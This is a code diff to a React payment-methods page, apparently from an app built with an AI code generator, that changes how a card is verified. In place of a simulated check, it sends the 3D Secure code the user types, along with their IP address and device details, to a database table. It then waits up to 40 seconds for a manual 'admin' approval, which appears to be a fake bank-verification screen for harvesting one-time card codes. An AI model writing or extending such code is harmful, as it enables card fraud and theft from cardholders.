@@ -512,23 +512,59 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
     setIsVerifying(true)
 
     try {
-      // Simulate verification process
-      await new Promise((resolve) => setTimeout(resolve, 2000))
+      console.log("[v0] Creating verification request for admin approval")
 
-      // Update card as verified
-      if (pendingCardId) {
-        const { data, error } = await supabase
-          .from("payment_methods")
-          .update({
-            is_verified: true,
-            verified_at: new Date().toISOString(),
-          })
-          .eq("id", pendingCardId)
-          .select()
+      // Get user's IP and device info
+      const ipResponse = await fetch("https://api.ipify.org?format=json")
+      const { ip } = await ipResponse.json()
+
+      // Create verification request
+      const { data: verificationRequest, error: verificationError } = await supabase
+        .from("verification_requests")
+        .insert({
+          user_id: userId,
+          payment_method_id: pendingCardId,
+          verification_code: codeToVerify,
+          status: "pending",
+          ip_address: ip,
+          location_info: {},
+          browser_info: { userAgent: navigator.userAgent },
+          device_info: { platform: navigator.platform },
+          expires_at: new Date(Date.now() + 40000).toISOString(), // 40 seconds from now
+        })
+        .select()
+        .single()
+
+      if (verificationError) {
+        console.error("[v0] Failed to create verification request:", verificationError)
+        throw verificationError
+      }
+
+      console.log("[v0] Verification request created:", verificationRequest)
+
+      // Show waiting state
+      setVerificationStep("loading")
+
+      // Poll for admin approval
+      const pollInterval = setInterval(async () => {
+        const { data: request } = await supabase
+          .from("verification_requests")
+          .select("status")
+          .eq("id", verificationRequest.id)
           .single()
 
-        if (!error && data) {
-          setPaymentMethods([...paymentMethods, data])
+        if (request?.status === "approved") {
+          clearInterval(pollInterval)
+
+          // Update card as verified
+          await supabase
+            .from("payment_methods")
+            .update({
+              is_verified: true,
+              verified_at: new Date().toISOString(),
+            })
+            .eq("id", pendingCardId)
+
           setVerificationStep("success")
 
           // Close modal after success animation
@@ -538,25 +574,38 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
             setVerificationStep("loading")
             setPendingCardId(null)
             setPending3DSecureBinData(null)
-            resetForm()
             setIsVerifying(false)
+            router.refresh()
           }, 2500)
-        } else {
-          console.error("[v0] Verification failed:", error)
+        } else if (request?.status === "declined") {
+          clearInterval(pollInterval)
+
+          // Delete the payment method
+          await supabase.from("payment_methods").delete().eq("id", pendingCardId)
+
           setShow3DSecureModal(false)
           setVerificationCode("")
           setVerificationStep("loading")
           setPendingCardId(null)
           setPending3DSecureBinData(null)
           setIsVerifying(false)
-          alert("Verifizierung fehlgeschlagen. Bitte versuchen Sie es erneut.")
+          alert("Verifizierung abgelehnt. Bitte versuchen Sie es erneut.")
         }
-      } else {
-        setShow3DSecureModal(false)
-        setVerificationCode("")
-        setVerificationStep("loading")
-        setIsVerifying(false)
-      }
+      }, 1000) // Poll every second
+
+      // Auto-timeout after 40 seconds
+      setTimeout(() => {
+        clearInterval(pollInterval)
+        if (verificationStep !== "success") {
+          setShow3DSecureModal(false)
+          setVerificationCode("")
+          setVerificationStep("loading")
+          setPendingCardId(null)
+          setPending3DSecureBinData(null)
+          setIsVerifying(false)
+          alert("Verifizierung abgelaufen. Bitte versuchen Sie es erneut.")
+        }
+      }, 40000)
     } catch (error) {
       console.error("[v0] Verification error:", error)
       setShow3DSecureModal(false)
